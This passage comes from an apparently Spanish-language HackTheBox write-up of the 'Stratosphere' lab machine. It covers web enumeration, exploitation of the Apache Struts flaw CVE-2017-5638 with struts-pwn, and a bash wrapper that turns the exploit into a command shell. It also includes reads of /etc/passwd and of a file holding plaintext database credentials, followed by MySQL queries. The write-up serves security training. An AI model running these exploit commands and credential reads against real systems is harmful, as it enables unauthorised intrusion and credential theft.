+SF:line&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;height:1px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;border:none&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;lt;/style&amp;gt;&amp;lt;/hea
+SF:d&amp;gt;&amp;lt;body&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.45 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos los puertos 80 y 8080 asociados al servicio HTTP, por lo que vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.64/
+http://10.10.10.64/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
+❯ whatweb http://10.10.10.64:8080/
+http://10.10.10.64:8080/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada interesante, así que vamos a ver el contenido web:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-stratosphere/stratosphere-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Que tampoco vemos algo que nos de valor como atacantes, así que vamos a tratar de descubrir rutas dentro del servidor web:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;153 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.64/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.64/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000004889:   302        0 L      0 W        0 Ch        &quot;manager&quot;                                                       
+000013290:   302        0 L      0 W        0 Ch        &quot;Monitoring&quot;                                                    
+000022971:   400        0 L      0 W        0 Ch        &quot;http%3A%2F%2Fwww&quot;                                              
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 127.3097
+Processed Requests: 39673
+Filtered Requests: 39670
+Requests/sec.: 311.6257
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;153 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.64:8080/FUZZ
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.64:8080/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000004889:   302        0 L      0 W        0 Ch        &quot;manager&quot;                                                       
+000013290:   302        0 L      0 W        0 Ch        &quot;Monitoring&quot;                                                    
+000022971:   400        0 L      0 W        0 Ch        &quot;http%3A%2F%2Fwww&quot;                                         
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 127.3097
+Processed Requests: 39673
+Filtered Requests: 39670
+Requests/sec.: 311.6257
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos los recursos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manager&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Monitoring&lt;/code&gt;, al tratar de checarlos, el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manager&lt;/code&gt; nos arroja un panel de login asociado a &lt;strong&gt;Apache Tomcat&lt;/strong&gt; y las credenciales por defecto no funcionan. Para el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Monitoring&lt;/code&gt; vemos un panel de login y notamos algo extraño en la dirección URL:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-stratosphere/stratosphere-monitoring.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Welcome.action&lt;/code&gt; con una extensión poco común; así que buscaremos un posible exploit relacionado con ese tipo de extensión.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/mazen160/struts-pwn&quot;&gt;struts-pwn&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos el recurso &lt;strong&gt;&lt;em&gt;struts-pwn&lt;/em&gt;&lt;/strong&gt; que es un exploit asociado a Apache Struts cuya vulnerabilidad se encuentra descrita en el CVE &lt;em&gt;CVE-2017-5638&lt;/em&gt; y que nos permite la ejecución de comandos a nivel de sistema; así que vamos a descargarlo a nuestro directorio de trabajo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ git clone https://github.com/mazen160/struts-pwn
+Clonando en &lt;span class=&quot;s1&quot;&gt;'struts-pwn'&lt;/span&gt;...
+remote: Enumerating objects: 37, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Total 37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 37
+Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;37/37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 8.92 KiB | 8.92 MiB/s, listo.
+Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;21/21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y de acuerdo con el repositorio, debemos instalar primeramente los requerimientos que necesita el programa para funcionar y hay que tener en cuenta que está desarrollado en python3.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ pip3 &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; requirements.txt
+WARNING: The directory &lt;span class=&quot;s1&quot;&gt;'/root/.cache/pip'&lt;/span&gt; or its parent directory is not owned or is not writable by the current user. The cache has been disabled. Check the permissions and owner of that directory. If executing pip with &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;, you may want &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'s -H flag.
+Collecting argparse
+  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
+Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2.25.1)
+Installing collected packages: argparse
+Successfully installed argparse-1.4.0
+❯ 
+❯ python3 struts-pwn.py -h
+usage: struts-pwn.py [-h] [-u URL] [-l USEDLIST] [-c CMD] [--check]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     Check a single URL.
+  -l USEDLIST, --list USEDLIST
+                        Check a list of URLs.
+  -c CMD, --cmd CMD     Command to execute. (Default: id)
+  --check               Check if a target is vulnerable.
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro del panel de ayuda de la herrmienta, se cuenta con un checker, así que vamos a validar si la máquina víctima es vulnerable:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 struts-pwn.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.64:8080/Monitoring/example/Welcome.action &lt;span class=&quot;nt&quot;&gt;--check&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Status: Vulnerable!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;%] Done.
+❯ python3 struts-pwn.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.64/Monitoring/example/Welcome.action &lt;span class=&quot;nt&quot;&gt;--check&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; URL: http://10.10.10.64/Monitoring/example/Welcome.action
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Status: Vulnerable!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;%] Done.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Otra forma de validar si el sitio es vulnerable es mediante el uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, buscando si existe el CVE y agregando la ruta:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ locate cve2017-5638.nse
+/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse
+❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-vuln-cve2017-5638 &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/Monitoring/ &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; 10.10.10.64
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-12 16:07 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.64
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+| http-vuln-cve2017-5638: 
+|   VULNERABLE:
+|   Apache Struts Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-5638
+|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
+|       vulnerability via the Content-Type header.
+|           
+|     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2017-03-07
+|     References:
+|       https://cwiki.apache.org/confluence/display/WW/S2-045
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2017-5638
+|_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.98 seconds
+❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-vuln-cve2017-5638 &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/Monitoring/ &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.64
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-12 16:07 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.64
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-vuln-cve2017-5638: 
+|   VULNERABLE:
+|   Apache Struts Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-5638
+|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
+|       vulnerability via the Content-Type header.
+|           
+|     Disclosure &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2017-03-07
+|     References:
+|       https://cwiki.apache.org/confluence/display/WW/S2-045
+|       http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CVE-2017-5638
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.27 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a validar si podemos ejecutar comandos a nivel de sistema y para evitar hacer para el puerto 80 y luego para el puerto 8080, vamos a tomar únicamente el puerto 8080:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 struts-pwn.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.64/Monitoring/example/Welcome.action &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; URL: http://10.10.10.64/Monitoring/example/Welcome.action
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; CMD: &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;help.
+EXCEPTION::::--&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connection broken: InvalidChunkLength(got length b'', 0 bytes read)&quot;&lt;/span&gt;, InvalidChunkLength&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;got length b&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, 0 bytes &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+Note: Server Connection Closed Prematurely
+
+tomcat8
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;%] Done.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos encontramos como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tomcat8&lt;/code&gt;. Si tratamos de entablarnos una reverse shell, vemos que NO nos va a dejar; asi que vamos vamos a buscar recursos y otra forma de obtener acceso a la máquina. Asi que nos vamos a crear un script en bash para tener mejor movilidad a la hora de ejecutar comandos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;ctrl_c&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;ctrl_c INT
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exit&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read command
+        &lt;/span&gt;python3 struts-pwn.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.64:8080/Monitoring/example/Welcome.action &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Prematurely&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 100 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Note:|Done&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a checar los archivos que se encuentra en el directorio:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap ./shell_struts.sh
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami
+
+&lt;/span&gt;tomcat8
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+
+total 16
+lrwxrwxrwx 1 root    root      12 Sep  3  2017 conf -&amp;gt; /etc/tomcat8
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root    root      68 Oct  2  2017 db_connect
+drwxr-xr-x 2 tomcat8 tomcat8 4096 Sep  3  2017 lib
+lrwxrwxrwx 1 root    root      17 Sep  3  2017 logs -&amp;gt; ../../log/tomcat8
+drwxr-xr-x 2 root    root    4096 Oct 12 16:04 policy
+drwxrwxr-x 4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
+lrwxrwxrwx 1 root    root      19 Sep  3  2017 work -&amp;gt; ../../cache/tomcat8
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+rtkit:x:105:109:RealtimeKit,,,:/proc:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+messagebus:x:107:110::/var/run/dbus:/bin/false
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+lightdm:x:111:113:Light Display Manager:/var/lib/lightdm:/bin/false
+pulse:x:112:114:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+avahi:x:113:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+saned:x:114:118::/var/lib/saned:/bin/false
+richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
+tomcat8:x:115:119::/var/lib/tomcat8:/bin/bash
+mysql:x:116:120:MySQL Server,,,:/nonexistent:/bin/false
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro del directorio donde nos encontramos, vemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db_connect&lt;/code&gt; el cual posiblemente contenga credenciales:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;db_connect
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ssn]
+&lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ssn_admin
+&lt;span class=&quot;nv&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AWs64@on&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&amp;amp;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin
+&lt;span class=&quot;nv&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podriamos tratar de ver el contenido de la base de datos con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; mysql &lt;span class=&quot;nt&quot;&gt;-uadmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-padmin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;show databases&quot;&lt;/span&gt;
+
+Database
+information_schema
+&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$~&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos la base de datos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users&lt;/code&gt;, vamos a tratar de listar las tablas que contiene:&lt;/p&gt;
+
